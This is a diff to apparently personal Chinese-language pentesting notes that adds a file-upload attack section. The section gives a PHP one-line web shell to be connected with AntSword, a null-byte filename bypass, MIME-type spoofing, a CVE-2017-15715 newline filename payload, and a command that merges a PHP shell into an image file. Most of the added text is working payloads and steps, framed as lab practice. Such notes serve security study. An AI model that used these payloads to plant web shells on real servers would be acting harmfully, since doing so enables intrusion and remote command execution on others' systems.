@@ -381,6 +381,8 @@ eyJuYW1lIjoiYCthbGVydCgxKStgIn0=
 
 ## Fastjson 案例
 
+fastjson是阿里巴巴开发的json库
+
 ### GET 传参案例案例
 
 原链接：
@@ -679,4 +681,131 @@ for order_id in range(start_id, end_id + 1):
 建议：
 
 - 如果是服务器刚开始就运行代码，建议可以递增取`tradeId`，因为所有的`tradeId`都没有被使用过，如果是已经测试很多遍的脚本程序，那可以使用`random`函数进行提取，只不过数据范围要越过之前用过的`ID`
-  
+
+
+
+
+
+## 文件上传案例
+
+### 基础文件上传案例
+
+直接新建`shell.php`文件
+
+```php
+<?php @eval($_POST['cmd'])?>
+```
+
+直接上传，然后蚁剑连接
+
+![image-20250228101829368](../../_media/image-20250228101829368.png)
+
+
+
+### 图片上传（NullByte 截断类型）绕过
+
+还是一样的文件，选择上传，发现如下：
+
+![image-20250228101955631](../../_media/image-20250228101955631.png)
+
+
+
+发现他是检查图片类型
+
+那我们进行抓包修改文件名：
+
+```
+shell.php%00.jpg
+```
+
+![image-20250228102344134](../../_media/image-20250228102344134.png)
+
+
+
+成功上传了
+
+![image-20250228102400489](../../_media/image-20250228102400489.png)
+
+
+
+
+
+### 图片上传（MIME 类型伪造）绕过
+
+MIME类型检测，也是可以抓包绕过的
+
+其中MIME类型有许多，一般是通过HTTP请求包的`Content-Type`字段来进行判断
+
+```
+text/plain（纯文本）
+text/html（HTML 文档）
+text/javascript（js 代码）
+application/xhtml+xml（XHTML 文档）
+image/gif（GIF 图像）
+image/jpeg（JPEG 图像）
+image/png（PNG 图像）
+video/mpeg（MPEG 动画）
+application/octet-stream（二进制数据）
+application/pdf（PDF 文档）
+```
+
+
+
+还是一样上传文件，然后进行抓包，将`application/octet-stream`修改为`image/jpeg`
+
+![image-20250228102927760](../../_media/image-20250228102927760.png)
+
+
+
+
+
+成功上传
+
+![image-20250228105114716](../../_media/image-20250228105114716.png)
+
+
+
+
+
+### CVE-2017-15715：Apache HTTPD 换行解析漏洞
+
+Apache HTTPD 换行解析漏洞是一种 Web 服务器（Apache HTTPD）的安全漏洞，也被称为 CRLF 注入漏洞。
+
+多语言编码的 Content-Disposition ：
+
+```
+Content-Disposition: form-data; name="filename"; filename*=UTF-8''1.php%0a.jpg
+```
+
+![image-20250228105539660](../../_media/image-20250228105539660.png)
+
+
+
+![image-20250228105549552](../../_media/image-20250228105549552.png)
+
+
+
+### 图片上传：检查文件头
+
+这时候上传的时候修改协议包的那些标识都是不管用的了
+
+![image-20250228105815603](../../_media/image-20250228105815603.png)
+
+
+
+这时候直接上传图片马即可
+
+本地找到图片和shell.php
+
+```
+copy xxx.png/b + shell.php/a shell.png
+```
+
+可以看到协议包内容
+
+![image-20250228105911860](../../_media/image-20250228105911860.png)
+
+成功上传
+
+![image-20250228105922188](../../_media/image-20250228105922188.png)
+
